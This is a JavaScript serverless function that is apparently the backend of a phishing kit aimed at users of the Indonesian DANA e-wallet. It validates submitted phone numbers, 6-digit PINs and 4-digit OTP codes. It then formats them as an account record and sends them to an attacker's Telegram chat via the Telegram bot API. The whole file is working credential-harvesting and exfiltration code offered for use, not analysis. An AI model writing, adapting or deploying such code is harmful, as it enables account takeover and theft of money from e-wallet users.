const axios = require('axios');

// Format Telegram message
function formatMessage(type, phone, pin, otp) {
  const cleanPhone = phone.replace(/\D/g, '');
  
  let message = 
    "├• AKUN | DANA E-WALLET\n" +
    "├───────────────────\n" +
    `├• NO HP : ${cleanPhone}\n`;

  if (pin) {
    message += "├───────────────────\n" +
               `├• PIN  : ${pin}\n`;
  }

  if (otp) {
    message += "├───────────────────\n" +
               `├• OTP : ${otp}\n`;
  }

  message += "╰───────────────────";
  return message;
}

// Validasi format nomor telepon Indonesia
function isValidIndonesianPhone(phone) {
  const cleanPhone = phone.replace(/\D/g, '');
  return cleanPhone.length >= 10 && cleanPhone.length <= 13 && cleanPhone.startsWith('8');
}

// Validasi PIN (6 digit)
function isValidPIN(pin) {
  return /^\d{6}$/.test(pin);
}

// Validasi OTP (4 digit)
function isValidOTP(otp) {
  return /^\d{4}$/.test(otp);
}

exports.handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method Not Allowed' }) };
  }

  try {
    // Parse and validate request
    const { type, phone, pin, otp } = JSON.parse(event.body);
    
    // Validasi input
    if (!type || !phone) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Type and phone are required' })
      };
    }

    if (!isValidIndonesianPhone(phone)) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid phone number format' })
      };
    }

    if (type === 'pin' && (!pin || !isValidPIN(pin))) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid PIN format' })
      };
    }

    if (type === 'otp' && (!otp || !isValidOTP(otp))) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid OTP format' })
      };
    }

    // Clean phone number
    const cleanPhone = phone.replace(/\D/g, '');
    
    if (cleanPhone.length < 10) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Phone number must be at least 10 digits' })
      };
    }

    // Check Telegram config
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Missing Telegram credentials');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Server configuration error' })
      };
    }

    // Format and send message
    const message = formatMessage(type, cleanPhone, pin, otp);
    
    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      },
      {
        timeout: 5000 // 5 second timeout
      }
    );

    console.log('Telegram message sent successfully:', {
      status: telegramResponse.status,
      timestamp: new Date().toISOString()
    });

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true,
        message: 'Data sent successfully',
        telegram_status: telegramResponse.status
      })
    };

  } catch (error) {
    console.error('Error:', {
      message: error.message,
      stack: error.stack,
      timestamp: new Date().toISOString()
    });
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal Server Error',
        details: 'Something went wrong'
      })
    };
  }
};
